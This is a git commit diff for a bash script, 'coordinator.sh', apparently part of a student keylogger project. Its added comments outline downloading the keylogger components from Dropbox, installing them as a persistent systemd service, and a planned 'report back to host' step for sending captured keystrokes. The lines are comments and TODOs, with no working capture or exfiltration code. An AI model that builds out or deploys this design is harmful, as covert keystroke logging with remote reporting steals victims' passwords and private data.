34b555eae2eeb966dbedb7085cb951357dc7e346
Sam Castle <castles2@vcu.edu>
2023-04-17 13:37:40 -0400

    add more comments to coordinator, create initial version of service file

--- src/coordinator.sh
+++ src/coordinator.sh
@@ -1,14 +1,23 @@
 #!/bin/bash
+# application to install, setup, and run the keylogger.
 
 # dl.dropboxusercontent.com prepends/replaces www.dropbox.com for direct download
 # wget?
 
-# DOWNLOAD FILES
+# DOWNLOAD FILES if they are not already installed
+# nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
 
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
+# copy nicekeylogger.service to /etc/systemd/system/
+# systemctl enable nicekeylogger.service
+# systemctl daemon-reload
 
 
 # RUN APPLICATION
 
+
+# REPORT BACK TO HOST
+# TODO - decide the period to report back
+# TODO - control size of report; only send new content? only send UDP payload? On size == x?
 
